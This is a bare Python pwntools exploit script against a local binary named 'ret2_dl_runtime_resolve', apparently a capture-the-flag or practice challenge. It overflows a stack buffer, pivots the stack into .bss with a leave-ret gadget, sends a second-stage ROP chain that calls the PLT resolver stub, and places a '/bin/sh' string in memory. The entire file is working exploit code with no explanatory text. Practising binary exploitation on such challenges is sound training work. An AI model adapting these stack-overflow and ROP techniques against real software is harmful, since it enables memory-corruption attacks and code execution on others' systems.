from pwn import *

p = process("./ret2_dl_runtime_resolve")
gdb.attach(p,"b *0x08048557")
elf = ELF("./ret2_dl_runtime_resolve")

	
ebp = 0x080485eb
leave_ret = 0x08048557
pop3 = 0x080485e9
bss_addr = 0x0804A900
rop_addr = bss_addr
cmd = "/bin/sh\x00"
cmd_addr = bss_addr + 0x200
plt0 = 0x08048380
write_index = 0x10

p.recvuntil("ret2_dl_runtime_resolve\n")
payload1 = "a" * 0x108 + "junk"
payload1 += p32(elf.plt["read"]) + p32(pop3) + p32(0) + p32(bss_addr) + p32(0x500)
payload1 += p32(ebp) + p32(rop_addr - 4)
payload1 += p32(leave_ret)
payload1 = payload1.ljust(0x200,"\x00")
p.send(payload1)

rop_data = p32(plt0) + p32(write_index) + p32(pop3) + p32(1) + p32(cmd_addr) + p32(8)
rop_data = rop_data.ljust(0x200,"\x00")
rop_data += cmd
rop_data = rop_data.ljust(0x500,"\x00")
assert len(rop_data) <= 0x500
p.send(rop_data)

p.interactive()
